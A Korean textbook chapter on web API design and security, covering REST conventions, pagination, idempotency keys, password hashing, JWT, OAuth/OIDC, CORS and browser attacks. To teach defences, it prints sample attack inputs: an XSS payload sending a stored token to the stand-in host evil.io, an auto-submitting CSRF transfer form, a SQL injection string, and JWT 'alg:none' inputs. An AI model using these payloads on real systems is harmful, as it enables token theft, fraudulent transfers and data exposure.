7장 웹 API 설계와 보안

API는 약속이고, 보안은 그 약속을 지키는 일이다

좋은 API가 무엇을 약속하는지 설계 원칙으로 먼저 정리하고, 그 약속을 누가 호출할 수 있는지 토큰, 암호, 브라우저 정책으로 지키는 과정을 따라갑니다.

선수 지식
2장 HTTP와 쿠키, 6장 필터와 DispatcherServlet
슬라이드
52장
예상 학습 시간
120분

아래층부터 위로 쌓아 올라가는 순서입니다. 지금은 7단계입니다.

1부

API를 약속으로 설계하기

6장에서 요청이 컨트롤러까지 오는 길을 봤습니다. 컨트롤러가 바깥에 내놓는 API는 앱과 다른 팀이 의존하는 공개 계약이라 한번 배포하면 바꾸기 어렵습니다. 그래서 "지금 동작하는가"보다 "예측 가능하고 오래 버티는가"를 기준으로 설계합니다.

REST는 여섯 가지 제약 조건의 묶음이다

제약 조건뜻얻는 것
Client-Server화면과 데이터 처리를 분리양쪽을 독립적으로 발전
Stateless요청마다 필요한 정보를 모두 담음아무 서버나 처리 가능, 확장 쉬움
Cacheable응답에 캐시 가능 여부를 표시중간 계층이 응답 재사용
Uniform Interface리소스를 URI로, 조작은 표준 메서드로누구나 같은 방식으로 호출
Layered System중간에 프록시, 게이트웨이를 끼울 수 있음보안, 캐시 계층 추가
Code-on-Demand서버가 실행 코드를 내려줌(선택)클라이언트 기능 확장

REST(Representational State Transfer)는 2000년 Roy Fielding의 박사 논문에서 정의한 아키텍처 스타일로, 표준이 아니라 제약 조건의 묶음입니다. 실무에서 "RESTful하다"는 말은 대개 Stateless와 Uniform Interface를 지킨다는 뜻입니다. 링크로 다음 동작을 안내하는 HATEOAS까지 지키는 API는 드뭅니다.

URI는 명사로, 동작은 메서드로 말한다

# 피해야 할 모양: 동사가 URI에 들어감
POST /getOrders
POST /createOrder
GET  /deleteOrder?id=42

# 리소스 중심: 명사(복수형) + 메서드
GET    /orders            # 목록
POST   /orders            # 생성
GET    /orders/42         # 단건
PATCH  /orders/42         # 일부 수정
DELETE /orders/42         # 삭제
GET    /users/7/orders    # 소속 관계
GET    /orders?status=PAID&sort=-createdAt

URI는 리소스(자원)의 이름이고, 무엇을 할지는 HTTP 메서드가 정합니다. 그래야 캐시와 프록시가 2장에서 본 메서드의 안전성, 멱등성을 믿고 활용합니다.

필터와 정렬은 쿼리 문자열에 둡니다. "주문 취소"처럼 CRUD로 안 떨어지는 동작은 상태 변화로 봅니다. 상태값만 바뀌면 PATCH로, 사유와 환불 기록이 남으면 POST /orders/42/cancellation처럼 하위 리소스로 만듭니다.

상태 코드는 클라이언트의 다음 행동을 정한다

상황코드클라이언트가 할 일
리소스 생성 성공201 + Location새 리소스 주소로 이동
본문 형식이 틀림400요청을 고쳐서 재전송
형식은 맞지만 규칙 위반422입력값을 사용자에게 다시 받음
상태 충돌(중복, 버전)409최신 상태를 다시 읽고 판단
요청이 너무 많음429Retry-After만큼 기다림(8장)
서버 오류500 / 503멱등 요청만 재시도

"모든 응답을 200으로 주고 본문에 실패 코드를 담는" 방식은 모니터링, 재시도, 캐시가 응답을 오해하게 만듭니다. 401과 403의 구분은 뒤에서 인증과 함께 봅니다.

에러 응답은 표준 포맷 하나로 통일한다

HTTP/1.1 422 Unprocessable Content
Content-Type: application/problem+json

{
  "type": "https://api.example.com/errors/stock",
  "title": "재고가 부족합니다",
  "status": 422,
  "detail": "상품 381의 재고는 2개입니다",
  "instance": "/orders/req-9f2c",
  "code": "OUT_OF_STOCK"
}

엔드포인트마다 에러 모양이 다르면 클라이언트는 분기 코드를 끝없이 늘려야 합니다. Problem Details는 이를 위한 IETF 표준으로, 2023년 RFC 7807을 대체했습니다.

type은 에러 종류의 식별자, detail은 사람이 읽을 설명입니다. code처럼 필요한 필드는 확장해도 됩니다. Spring 6의 ProblemDetail 클래스가 이 형식을 그대로 지원합니다.

인증은 누구인지, 인가는 무엇을 해도 되는지

인증은 요청한 주체가 누구인지 확인하는 일입니다. 비밀번호, 토큰, 인증서가 그 수단입니다. 인가는 확인된 주체가 이 리소스에 이 동작을 해도 되는지 판단하는 일입니다.

순서는 항상 인증이 먼저입니다. 누구인지 모르면 권한을 따질 수 없기 때문입니다.

상황코드
토큰이 없거나 만료됨401 Unauthorized
로그인했지만 권한 없음403 Forbidden
남의 주문 존재를 숨김404 Not Found
 401은 이름과 달리 "인증 실패"이며, 응답에 WWW-Authenticate 헤더를 실어야 합니다(RFC 9110).

세션은 서버가 기억하고, 토큰은 요청이 증명한다

항목세션 기반토큰(JWT) 기반
상태 저장 위치서버 메모리나 Redis토큰 자체(클라이언트)
요청 검증세션 ID로 저장소 조회서명만 검증, 조회 불필요
서버 확장세션 공유 필요(8장)어느 서버든 검증 가능
즉시 무효화세션 삭제로 끝만료 전까지 유효
크기세션 ID 수십 바이트클레임에 따라 수백 바이트 이상

쿠키와 세션 ID의 동작 방식은 2장에서 봤습니다. 둘 중 무엇이 더 낫다기보다, "상태를 어디에 둘 것인가"의 선택이며 각자의 약점을 보완하는 장치가 뒤따릅니다.

2부

데이터가 움직여도, 요청이 반복돼도 맞아야 한다

목록은 조회하는 사이에도 바뀌고, 네트워크는 응답을 잃어버립니다. 이런 조건에서도 결과가 틀리지 않게 만드는 두 가지 설계를 봅니다.

기초 원리 여기부터는 DB 쿼리와 서버 저장소 수준에서 왜 그렇게 동작하는지 봅니다.

offset 페이지네이션은 밀리고 느려진다

LIMIT 5 OFFSET 5는 "앞의 5개를 건너뛰라"는 뜻입니다. 사용자가 1페이지를 보는 사이 새 글이 하나 들어오면 모든 행이 한 칸씩 밀려, 2페이지 첫 줄에 이미 본 글이 다시 나옵니다. 삭제가 일어나면 반대로 한 건을 놓칩니다.

성능도 문제입니다. DB는 건너뛸 행을 실제로 읽고 버리므로 OFFSET 1000000은 백만 행을 읽습니다(4장 인덱스 참고).

cursor는 "어디서부터"를 값으로 기억한다

-- offset: 앞의 N행을 읽고 버림
SELECT * FROM post
ORDER BY created_at DESC, id DESC
LIMIT 20 OFFSET 100000;

-- cursor: 마지막으로 본 행 다음부터
SELECT * FROM post
WHERE (created_at, id) < (:lastAt, :lastId)
ORDER BY created_at DESC, id DESC
LIMIT 20;

-- 인덱스: (created_at, id)

cursor 페이지네이션은 마지막으로 본 행의 정렬 키를 기준점으로 넘깁니다. 인덱스에서 그 지점을 바로 찾아 20건만 읽으므로 몇 번째 페이지든 속도가 같고, 중간에 행이 추가돼도 밀리지 않습니다.

created_at이 같은 행이 있을 수 있어 id를 함께 써서 순서를 유일하게 만듭니다. 응답에는 이 값을 Base64로 감싼 불투명한 nextCursor를 줍니다.

두 방식은 화면 요구사항으로 고른다

항목offsetcursor
임의 페이지 이동가능(7페이지로 점프)불가, 앞뒤로만 이동
깊은 페이지 성능갈수록 느려짐일정함
데이터 변경 중 정확성중복이나 누락 발생밀리지 않음
정렬 조건자유로움인덱스와 맞는 유일한 키 필요
어울리는 화면관리자 표, 검색 결과 페이지무한 스크롤, 피드, 동기화 API

전체 개수(COUNT(*))도 큰 테이블에서는 비쌉니다. 무한 스크롤이라면 개수 대신 hasNext만 주는 편이 낫습니다.

응답을 잃어버린 재시도가 결제를 두 번 한다

클라이언트결제 서버
POST /payments 10,000원 카드 승인
타임아웃 201 Created응답이 네트워크에서 유실됨
POST /payments 재시도 또 승인
사용자는 20,000원이 빠져나감

클라이언트 입장에서 타임아웃은 "실패"가 아니라 "결과를 모름"입니다. 서버가 처리했는지 알 수 없으니 재시도하고 싶지만, POST는 멱등이 아니라서(2장) 같은 요청이 새 결제를 또 만듭니다.

그렇다면 POST도 안전하게 재시도할 수 있게 만들 방법이 필요합니다.

Idempotency-Key로 같은 요청임을 알린다

  1. 키 생성

    클라이언트가 결제 시도마다 UUID를 만들어 헤더에 싣습니다.

  2. 키 선점

    서버가 키를 "처리 중"으로 원자적으로 저장한 뒤 결제를 실행합니다.

  3. 결과 저장

    상태 코드와 응답 본문을 키에 붙여 저장합니다.

  4. 같은 키 재요청

    다시 실행하지 않고 저장된 응답을 그대로 돌려줍니다.

  5. 예외 응답

    처리 중이면 409, 같은 키에 다른 본문이면 422로 거절합니다.

핵심은 재시도 여부를 서버가 판단할 수 있게 요청에 정체성을 붙이는 것입니다. 키가 같으면 같은 의도이므로 결과도 같아야 합니다.

이 방식은 Stripe 같은 결제 API가 먼저 썼고, 지금은 IETF에서 Idempotency-Key 헤더 표준 초안으로 정리되고 있습니다. 409, 422 응답도 그 초안의 권고입니다.

키 저장은 원자적으로, 보관은 기한을 두고

CREATE TABLE idempotency_key (
  key          VARCHAR(64),
  user_id      BIGINT,
  request_hash CHAR(64),   -- 본문 SHA-256
  status       VARCHAR(16),-- PROCESSING/DONE
  response     JSON,
  created_at   TIMESTAMP,
  PRIMARY KEY (user_id, key)
);
-- INSERT 성공한 요청만 결제를 실행
-- 중복 INSERT는 키 위반으로 즉시 실패

"조회 후 없으면 저장"은 두 요청이 동시에 조회를 통과하는 경쟁 상태를 만듭니다. 그래서 유니크 제약 INSERT나 Redis SET NX(8장)로 선점 자체를 한 번에 합니다.

키는 사용자 단위로 범위를 나누고, 본문 해시로 오용을 막습니다. Stripe는 24시간이 지난 키를 정리합니다. 재시도가 일어날 만한 기간만 보관하면 충분합니다.

3부

토큰과 비밀번호를 지키는 암호 도구들

2장에서는 TLS가 암호 기법을 어떻게 조합해 쓰는지 봤습니다. 여기서는 그 도구 하나하나가 무엇을 보장하고 무엇을 보장하지 않는지 원리로 정리합니다. 뒤의 JWT와 비밀번호 저장이 모두 이 위에 서 있습니다.

대칭키는 빠르고, 비대칭키는 키를 나눠 준다

항목대칭키비대칭키(공개키)
키암호화와 복호화에 같은 키공개키와 개인키 한 쌍
대표 알고리즘AES, ChaCha20RSA, ECDSA, ECDH
속도빠름, 대용량에 적합수백 배 이상 느림
약점키를 안전하게 전달하기 어려움느려서 큰 데이터에 부적합
주된 용도실제 데이터 암호화키 교환, 전자 서명

대칭키의 약점은 "처음 만난 상대와 어떻게 키를 나누는가"이고, 비대칭키는 공개키를 마음껏 뿌려도 개인키 없이는 풀 수 없어 이 문제를 풉니다. 2장의 TLS가 비대칭으로 대칭키를 합의하고, 데이터는 대칭으로 암호화한 이유가 바로 이것입니다.

해시, MAC, 서명은 보장하는 범위가 다르다

도구만드는 방법보장보장하지 않음
해시SHA-256(데이터)변조 탐지(값 비교 시)누가 만들었는지
MACHMAC(공유 비밀키, 데이터)무결성 + 키 가진 쪽이 만듦둘 중 누가 만들었는지
전자 서명개인키로 해시에 서명무결성 + 서명자 증명내용 비밀 유지
암호화AES, RSA 등내용 비밀 유지그 자체로는 무결성

해시는 입력이 1비트만 바뀌어도 결과가 완전히 달라지고, 결과에서 입력을 되돌릴 수 없는 단방향 함수입니다. 하지만 누구나 계산할 수 있으므로 공격자가 데이터를 바꾸고 해시도 다시 계산하면 그만입니다. 그래서 비밀키를 섞은 MAC이나 개인키로 만든 서명이 필요합니다.

비밀번호는 암호화하지 않고 느리게 해시한다

비밀번호를 암호화해 저장하면 키가 유출되는 순간 전부 복호화됩니다. 서버는 원래 비밀번호를 알 필요가 없고 "같은지"만 확인하면 되므로, 되돌릴 수 없는 해시가 맞습니다.

그런데 SHA-256만으로는 부족합니다. 빠르게 만든 함수라 GPU 한 장으로 초당 수십억 개의 후보를 시험할 수 있고, 같은 비밀번호는 같은 해시가 되어 미리 계산한 레인보우 테이블로 한 번에 풀립니다.

그래서 두 가지를 더합니다.

  • 솔트(Salt): 사용자마다 다른 무작위 값을 섞어, 같은 비밀번호도 다른 해시가 되게 합니다. 미리 계산한 표가 쓸모없어집니다.
  • 키 스트레칭(Key Stretching): 해시를 수천~수만 번 반복하거나 메모리를 많이 쓰게 해서 한 번 시도하는 비용을 일부러 키웁니다.

bcrypt와 Argon2는 솔트와 비용을 내장한다

$2a$10$N9qo8uLOickgx2ZMRZoMye
IjZAgcfl7p92ldGxad68LJZdL17lhWy  # 한 줄
# 2a: 알고리즘  10: cost(2^10 반복)
# 다음 22자: 솔트  나머지 31자: 해시값
알고리즘OWASP 최소 권장
Argon2id메모리 19MiB, 반복 2, 병렬 1
scryptN=2^17, r=8, p=1
bcryptcost 10 이상, 입력 72바이트 제한
PBKDF2HMAC-SHA-256, 60만 회(FIPS 필요 시)

bcrypt는 솔트와 cost를 결과 문자열에 함께 저장합니다. 그래서 별도 솔트 컬럼이 필요 없고, 나중에 cost를 올려도 기존 해시를 검증할 수 있습니다.

Argon2id는 연산과 함께 메모리를 많이 요구해 GPU 병렬 공격에 더 강합니다. Spring Security의 BCryptPasswordEncoder 기본 cost는 10입니다.

4부

토큰은 어떻게 스스로를 증명하는가

1부에서 토큰 방식은 "요청이 스스로 증명한다"고 했습니다. 그 증명이 서명으로 어떻게 만들어지는지, 만료와 무효화의 빈틈을 어떻게 메우는지, 다른 서비스에 권한을 맡기는 OAuth가 어떻게 동작하는지 봅니다.

JWT는 점으로 이은 세 조각이다

JWT의 각 조각은 JSON을 Base64url로 인코딩한 것입니다. Payload에는 sub(주체), exp(만료), iss(발급자), aud(대상) 같은 클레임이 들어갑니다.

서명이 있으니 서버는 저장소를 보지 않는다

  1. 발급

    로그인 성공 시 서버가 Header와 Payload를 만들고 서명을 붙입니다.

  2. 전송

    클라이언트는 매 요청에 Authorization: Bearer 토큰을 싣습니다.

  3. 서명 검증

    받은 Header.Payload로 서명을 다시 계산해 일치하는지 봅니다.

  4. 클레임 검증

    exp, iss, aud를 확인하고 sub를 사용자로 씁니다.

Payload의 role을 ADMIN으로 바꾸면 서명이 맞지 않게 됩니다. 서명을 새로 만들려면 서버의 키가 필요하므로 위조할 수 없습니다.

이것이 DB나 세션 저장소를 조회하지 않고도 요청을 믿을 수 있는 이유입니다. 동시에, 서버가 아무것도 기억하지 않으므로 발급한 토큰을 도중에 취소하기 어렵다는 약점도 여기서 나옵니다.

HS256은 키 공유, RS256은 공개키 배포

HS256은 HMAC-SHA256, 즉 대칭키 MAC입니다. 검증하는 모든 서버가 발급 키를 가져야 하므로, 검증만 하면 되는 서버도 토큰을 위조할 수 있습니다. 키는 256비트 이상이어야 합니다(RFC 7518).

RS256(또는 ES256)은 개인키로 서명하고 공개키로 검증합니다. 공개키는 /.well-known/jwks.json 같은 JWKS로 배포하고, Header의 kid로 어떤 키인지 고릅니다. 서비스가 여럿이면 RS256이 기본입니다.

Payload는 암호화가 아니라 인코딩이다

$ echo 'eyJzdWIiOiI0MiIsInJvbGUiOiJVU0VSIn0' \
    | base64 -d
{"sub":"42","role":"USER"}

# 검증 라이브러리 설정에서 막아야 할 것
{"alg":"none"}         # 서명 없는 토큰
{"alg":"HS256"} + 공개키  # 알고리즘 혼동

Base64url은 누구나 되돌릴 수 있는 표기법일 뿐입니다. 서명은 변조를 막을 뿐 내용을 숨기지 않으므로, 주민번호나 이메일 같은 민감 정보를 Payload에 넣으면 안 됩니다. 숨겨야 한다면 JWE(암호화된 JWT)를 따로 씁니다.

검증 쪽은 Header의 alg를 믿지 말고, 허용할 알고리즘을 서버 설정으로 고정해야 합니다(RFC 8725).

Access는 짧게, Refresh는 길게 나눈다

JWT는 도중에 취소하기 어렵습니다. 그렇다면 탈취돼도 피해가 작도록 수명을 짧게 하면 됩니다. 하지만 15분마다 다시 로그인하라고 할 수는 없습니다.

그래서 토큰을 둘로 나눕니다. Access Token은 API 호출에 쓰는 짧은 토큰(수 분~1시간)이고, Refresh Token은 새 Access Token을 받는 데만 쓰는 긴 토큰(수일~수주)입니다.

항목AccessRefresh
보내는 곳모든 API재발급 엔드포인트만
서버 검증서명만(무상태)저장소 조회(상태)
노출 빈도높음낮음
탈취 시 피해만료까지 짧게계속 재발급 가능
 Refresh Token은 서버에 기록해 두어야 취소할 수 있습니다. 결국 상태가 일부 돌아옵니다.

Rotation은 재사용을 탈취의 신호로 본다

  1. 로그인

    서버가 RT1을 발급하고 토큰 계열(family)로 기록합니다.

  2. 정상 재발급

    RT1을 내면 새 Access와 RT2를 주고, RT1은 사용됨으로 표시합니다.

  3. 재사용 감지

    누군가 이미 쓴 RT1을 다시 내면 탈취로 보고 계열 전체를 폐기합니다.

  4. 재로그인

    공격자도, 정상 사용자도 RT2가 막혀 다시 로그인해야 합니다.

Rotation은 Refresh Token을 쓸 때마다 새것으로 바꿔 주는 방식입니다. 정상 클라이언트는 항상 최신 토큰만 쓰므로, 옛 토큰이 다시 나타났다면 누군가 복사해 갔다는 뜻입니다.

OAuth 보안 모범 사례(RFC 9700)는 공개 클라이언트의 Refresh Token에 Rotation이나 송신자 제한을 요구합니다.

로그아웃은 무상태에 상태를 조금 더하는 일이다

// 1. Refresh Token 폐기 (저장소에서 삭제)
refreshTokenRepository.deleteByFamily(familyId);

// 2. 남은 Access Token은 jti를 블랙리스트에
long ttl = claims.getExpiration().getTime()
         - System.currentTimeMillis();
redis.set("bl:" + claims.getId(), "1", ttl);

// 3. 인증 필터에서 매 요청 확인
if (redis.exists("bl:" + jti)) throw ...;

클라이언트가 토큰을 지워도 복사본은 만료까지 유효합니다. 즉시 막으려면 서버가 "이 토큰은 무효"라고 기억해야 합니다.

블랙리스트는 토큰의 남은 수명만큼만 보관하면 되므로 Redis TTL과 잘 맞습니다. 매 요청 조회가 생기지만, 전체 세션이 아니라 로그아웃한 토큰만 담기 때문에 작게 유지됩니다.

OAuth 2.0은 비밀번호 대신 권한을 위임한다

사진 인화 서비스가 내 구글 포토에 접근하려 할 때, 구글 비밀번호를 그 서비스에 알려 주는 것은 위험합니다. 모든 권한을 넘기게 되고 취소하려면 비밀번호를 바꿔야 합니다.

OAuth 2.0은 사용자가 구글에서 직접 동의하고, 서비스는 범위(scope)와 기한이 정해진 Access Token만 받게 하는 인가 위임 프로토콜입니다.

역할예시
Resource Owner사진의 주인인 사용자
Client사진 인화 서비스
Authorization Server구글 로그인과 동의 화면
Resource Server구글 포토 API

Code 흐름은 토큰을 백 채널로 숨긴다

브라우저 주소창을 거치는 프론트 채널에는 일회용 code만 지나가고, 토큰은 클라이언트와 인가 서버가 직접 통신하는 백 채널에서만 오갑니다.

PKCE는 code를 훔쳐도 쓸 수 없게 만든다

모바일 앱이나 SPA처럼 비밀을 숨길 수 없는 공개 클라이언트는 client_secret이 없습니다. 이때 리다이렉트 중에 code가 가로채지면 공격자가 그대로 토큰으로 바꿀 수 있습니다.

PKCE는 클라이언트가 매번 무작위 code_verifier(43~128자)를 만들고, 그 SHA-256 해시인 code_challenge만 먼저 보냅니다. 토큰 교환 때 원본 verifier를 내야 하므로 code만 훔친 공격자는 토큰을 받을 수 없습니다.

3부의 해시가 여기서 쓰입니다. 해시는 되돌릴 수 없으니 challenge가 노출돼도 verifier를 알아낼 수 없습니다.

지금의 기본값

RFC 9700은 공개 클라이언트에 PKCE를 필수로, 기밀 클라이언트에도 권장합니다. 토큰을 주소창으로 바로 주던 Implicit 흐름은 쓰지 말라고 합니다.

OIDC는 OAuth 위에 "누구인지"를 얹는다

OAuth의 Access Token은 "이 API를 호출해도 된다"는 인가 증표일 뿐, 사용자가 누구인지 알려 주는 표준 형식이 없습니다. 그런데 "구글로 로그인"은 정확히 그것, 즉 인증이 필요합니다.

OIDC는 scope에 openid를 넣으면 토큰 응답에 ID Token을 함께 주도록 OAuth를 확장합니다. ID Token은 JWT이므로 앞에서 본 서명 검증을 그대로 씁니다.

항목Access TokenID Token
목적API 호출 권한로그인한 사용자 증명
받는 쪽리소스 서버클라이언트
형식규정 없음(불투명 가능)항상 JWT
핵심 클레임scopesub, aud, nonce
 ID Token을 API 호출에 쓰면 안 됩니다. aud가 클라이언트로 되어 있습니다.

Spring Security는 필터 체인이다

  1. 서블릿 필터DelegatingFilterProxy
  2. FilterChainProxyURL별 체인 선택
  3. 인증 필터토큰 검증, 사용자 설정
  4. AuthorizationFilter권한 확인, 거절
  5. DispatcherServlet컨트롤러 호출

6장에서 본 서블릿 필터 위에서 동작합니다. 컨테이너에 등록된 필터 하나가 Spring Bean인 FilterChainProxy에 위임하고, 그 안의 SecurityFilterChain이 CORS, CSRF, 인증, 인가 필터를 순서대로 실행합니다.

인증 결과는 SecurityContextHolder에 담기며 기본 저장 방식은 ThreadLocal(5장)입니다. 인증 실패는 401, 인가 실패는 403으로 ExceptionTranslationFilter가 바꿔 줍니다.

5부

브라우저는 경계를 긋고, 공격은 그 틈을 노린다

API를 호출하는 주체가 브라우저라면 사정이 달라집니다. 브라우저는 쿠키를 자동으로 보내고 남의 스크립트도 실행합니다. 그래서 생긴 경계 규칙과, 그 규칙을 우회하는 대표 공격 세 가지를 봅니다.

SOP: 출처가 다르면 응답을 읽지 못한다

동일 출처 정책(SOP)은 한 출처의 스크립트가 다른 출처의 응답을 읽지 못하게 하는 브라우저 규칙입니다. 출처는 스킴, 호스트, 포트 세 가지가 모두 같아야 같습니다.

이 규칙이 없으면 악성 사이트의 스크립트가 내 쿠키가 실린 채로 은행 API를 호출하고 응답 내용까지 읽어 갈 수 있습니다.

https://shop.com 기준결과
https://shop.com/api같은 출처
http://shop.com다름(스킴)
https://api.shop.com다름(호스트)
https://shop.com:8443다름(포트)
 SOP는 요청 전송이 아니라 응답 읽기를 막습니다. 폼 전송, 이미지 로드는 원래 다른 출처로도 됩니다.

CORS는 서버가 허락한 출처에만 문을 연다

브라우저api.shop.com
사전 요청 OPTIONS /orders Origin: https://shop.comAccess-Control-Request-Method: POST
204 Allow-Origin: https://shop.comAllow-Methods, Allow-Headers, Max-Age
실제 요청 POST /orders Content-Type: JSON
읽기 허용 201 Allow-Origin: https://shop.com

CORS는 SOP에 예외를 여는 표준입니다. 서버가 응답 헤더로 허용 출처를 밝히면 브라우저가 스크립트에 응답을 넘겨 줍니다.

application/json 본문이나 Authorization 헤더처럼 단순 요청 범위를 넘으면, 브라우저가 먼저 사전 요청으로 허락을 묻습니다.

CORS는 브라우저가 지키는 규칙이다

메서드가 GET, HEAD, POST이고 Content-Type이 폼이나 text/plain인 단순 요청은 사전 요청 없이 바로 전송됩니다. 서버는 이미 처리를 끝냈고, 브라우저는 응답을 스크립트에 넘길지만 결정합니다.

또 curl이나 서버 간 호출에는 CORS가 아예 없습니다. 그러니 CORS는 API 보호 수단이 아닙니다. 인증과 인가는 서버가 따로 해야 합니다.

쿠키를 보낼 때는 와일드카드 금지

credentials 요청에는 Allow-Origin: *가 허용되지 않습니다. 정확한 출처와 Allow-Credentials: true를 함께 줘야 합니다.

Access-Control-Max-Age로 사전 요청 결과를 캐시할 수 있지만 브라우저가 상한을 둡니다(Chromium 2시간, Firefox 24시간).

XSS: 남의 스크립트가 내 페이지에서 돈다

<!-- 게시글 본문에 저장된 입력 -->
<img src=x onerror="fetch('//evil.io?c='+
  localStorage.getItem('token'))">

<!-- 출력 시 HTML 이스케이프하면 -->
&lt;img src=x onerror=...&gt;  글자로만 보임

# 추가 방어: 응답 헤더
Content-Security-Policy: script-src 'self'

XSS는 공격자의 입력이 HTML로 해석되어 피해자의 브라우저에서 실행되는 공격입니다. 같은 출처에서 도는 코드이므로 SOP가 막아 주지 않고, localStorage의 토큰도 읽힙니다.

방어의 중심은 출력 위치에 맞는 이스케이프입니다. 여기에 CSP로 허용 스크립트를 제한하고, 쿠키에 HttpOnly를 붙여 스크립트 접근을 막습니다.

CSRF: 자동으로 붙는 쿠키를 악용한다

<!-- 피해자가 bank.com에 로그인된 상태 -->
<form action="https://bank.com/transfer"
      method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000000">
</form>
<script>document.forms[0].submit()</script>

CSRF는 공격자가 응답을 읽지 않아도 됩니다. 요청만 보내면 브라우저가 bank.com 세션 쿠키를 자동으로 실어 주고, 서버는 정상 요청으로 처리합니다.

방어는 공격 페이지가 알 수 없는 값을 요구하는 것입니다. 폼마다 CSRF 토큰을 넣거나, 쿠키에 SameSite=Lax 이상을 줘서 교차 사이트 POST에 쿠키가 붙지 않게 하고, Origin 헤더를 확인합니다.

SQL Injection: 데이터가 코드가 된다

// 위험: 입력이 SQL 문법의 일부가 됨
String sql = "SELECT * FROM users WHERE name='"
           + name + "'";
// name = ' OR '1'='1  → 전체 행 반환

// 안전: 구조를 먼저 고정하고 값만 바인딩
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?");
ps.setString(1, name);

// MyBatis: #{name}은 바인딩, ${name}은 치환

문자열을 이어 붙이면 DB는 어디까지가 값이고 어디부터가 명령인지 구분하지 못합니다. PreparedStatement는 SQL 구조를 먼저 파싱해 두고 값을 나중에 넣으므로 입력이 문법으로 해석될 여지가 없습니다.

JPA도 JPQL을 문자열로 이어 붙이면 똑같이 뚫립니다. ORDER BY 컬럼명처럼 바인딩할 수 없는 곳은 허용 목록으로 검사합니다.

6부

운영에서 마주치는 선택과 사고

원리를 알아도 운영에서는 "어디에 저장할까", "털리면 무엇부터 할까", "왜 프론트에서만 막히지?" 같은 질문이 남습니다. API 변경 관리부터 앞단 구성까지 실제 판단 기준을 정리합니다.

원리 실무 버저닝 정책, 쿠키 설정값, 사고 대응 순서, 흔한 설정 실수를 다룹니다.

버전은 깨는 변경이 생길 때만 올린다

방식예장점단점
URI 경로/v1/orders눈에 보이고 라우팅 쉬움리소스 주소가 바뀜
커스텀 헤더Api-Version: 2URI 유지테스트, 캐시 설정이 번거로움
미디어 타입Accept: …v2+jsonHTTP 의미에 가장 충실도구 지원이 약함

선택 필드 추가, 새 엔드포인트 추가는 하위 호환이므로 버전을 올리지 않습니다. 필드 삭제나 이름 변경, 타입 변경, 선택을 필수로 바꾸는 것이 깨는 변경입니다.

클라이언트는 모르는 필드를 무시하도록 만들고, 옛 버전은 Deprecation, Sunset 헤더로 종료 일정을 알린 뒤 호출량을 보며 내립니다.

토큰 저장 위치는 XSS와 CSRF의 교환이다

저장 위치XSS에CSRF에판단
localStorage스크립트로 바로 탈취자동 전송 없어 안전XSS 하나로 장기 토큰 유출
HttpOnly 쿠키스크립트로 읽을 수 없음자동 전송, 방어 필요SameSite와 CSRF 토큰 병행
메모리(변수)페이지 안에서만 노출안전새로고침 시 사라짐

흔한 조합은 Access Token은 메모리에, Refresh Token은 HttpOnly 쿠키에 두는 것입니다. 새로고침하면 쿠키로 재발급 엔드포인트를 호출해 Access Token을 다시 받습니다. XSS가 있으면 어느 방식이든 그 세션 안에서는 요청을 대신 보낼 수 있으므로, 저장 위치는 피해 범위를 줄일 뿐 XSS 방어를 대신하지 않습니다.

쿠키 속성 하나하나가 공격 하나씩을 막는다

Set-Cookie: __Secure-rt=8f3a...;
  Path=/auth/refresh;
  Secure; HttpOnly;
  SameSite=Strict;
  Max-Age=1209600
속성막는 것
Secure평문 HTTP 전송으로 탈취
HttpOnlyXSS 스크립트의 읽기
SameSite교차 사이트 요청에 첨부(CSRF)
Path불필요한 엔드포인트로 전송

Refresh Token 쿠키는 재발급 경로에만 가도록 Path를 좁히고, 14일(1209600초)처럼 수명을 명시합니다. __Secure- 접두사는 브라우저가 Secure 없는 설정을 거부하게 만듭니다.

2장에서 봤듯 SameSite가 없을 때 Lax로 취급하는 것은 Chromium 계열뿐이므로 항상 명시합니다. 프론트와 API가 다른 사이트라 SameSite=None이 필요하면 CSRF 방어를 따로 둡니다.

토큰이 털렸을 때는 범위부터 끊는다

  1. Refresh 폐기

    해당 사용자의 토큰 계열을 모두 폐기해 재발급 통로를 닫습니다.

  2. Access 차단

    사용자별 토큰 버전을 올려 그 전에 발급된 토큰을 거절합니다.

  3. 키 교체

    서명 키가 샜다면 새 kid로 교체하고 JWKS에서 옛 키를 내립니다.

  4. 경로 추적

    발급 로그와 IP, User-Agent로 유출 경로와 영향 범위를 찾습니다.

  5. 재발 방지

    XSS 수정, 만료 단축, 비밀번호 재설정 요구 등을 적용합니다.

JWT를 무상태로만 운영하면 이 순간 할 수 있는 일이 "만료를 기다리기"뿐입니다. 그래서 평소에 토큰 버전이나 블랙리스트를 확인할 지점을 인증 필터에 미리 만들어 둡니다.

Access Token 수명이 짧을수록 2단계의 부담이 줄어듭니다. 수명은 탈취 시 감내할 시간과 재발급 트래픽 사이의 타협입니다.

CORS 설정 실수는 대개 다섯 가지다

실수무슨 일이 생기나고치는 법
요청 Origin을 그대로 반사credentials와 겹치면 아무 사이트나 응답을 읽음허용 목록과 정확히 비교
접미사 정규식 매칭evilshop.com도 통과스킴과 호스트 전체 비교
null 출처 허용샌드박스 iframe에서 우회null은 허용하지 않음
Vary: Origin 누락CDN이 다른 출처 응답을 재사용출처별 응답이면 Vary 추가
사전 요청에 401인증 필터가 OPTIONS를 막음CORS를 인증보다 먼저 처리

Spring Security에서는 http.cors()로 CORS 필터를 보안 체인 앞쪽에 두면, 인증 헤더가 없는 사전 요청이 401로 막히는 문제를 피할 수 있습니다.

API Gateway는 공통 관심사를 앞단에 모은다

서비스가 여럿으로 나뉘면 인증, TLS 종료, 라우팅, 요청 제한, 로깅을 서비스마다 반복하게 됩니다. API Gateway는 모든 외부 요청이 지나는 단일 입구에서 이것들을 한 번에 처리하는 리버스 프록시(2장)입니다.

Spring Cloud Gateway, Kong, AWS API Gateway(17장)가 대표적이고, 요청 제한 알고리즘은 8장에서 다룹니다.

비즈니스 로직은 넣지 마세요

게이트웨이는 모든 요청이 지나는 단일 장애점이 되기 쉽습니다. 얇게 유지하고 여러 대로 띄웁니다.

게이트웨이가 JWT를 검증해도 내부 서비스가 인가를 생략하면 안 됩니다. 내부망이 안전하다는 가정은 쉽게 깨집니다.

REST만이 답은 아니다: GraphQL과 gRPC

항목RESTGraphQLgRPC
엔드포인트리소스마다하나(/graphql)서비스 메서드마다
응답 모양서버가 정함클라이언트가 필드 선택.proto 스키마로 고정
전송HTTP, 주로 JSONHTTP, JSONHTTP/2, Protobuf 바이너리
HTTP 캐시쉬움어려움(대부분 POST)해당 없음
